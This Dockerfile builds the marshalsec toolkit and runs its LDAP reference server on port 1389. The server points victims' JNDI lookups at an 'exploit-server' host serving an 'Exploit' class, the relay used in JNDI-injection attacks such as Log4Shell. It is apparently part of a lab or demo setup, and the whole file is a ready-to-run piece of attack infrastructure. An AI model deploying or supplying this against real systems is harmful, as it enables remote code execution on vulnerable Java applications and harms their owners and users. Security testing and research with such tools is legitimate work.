# Build stage
FROM maven:3.8.4-jdk-11-slim AS build
WORKDIR /home
RUN apt-get update && \
    apt-get install -y git
RUN git clone https://github.com/mbechler/marshalsec.git && \
    cd marshalsec && \
    mvn clean package -DskipTests

# Package stage
FROM openjdk:11-jre-slim
COPY --from=build /home/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar ./marshalsec-0.0.3-SNAPSHOT-all.jar
EXPOSE 1389
CMD java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://exploit-server:8888/#Exploit"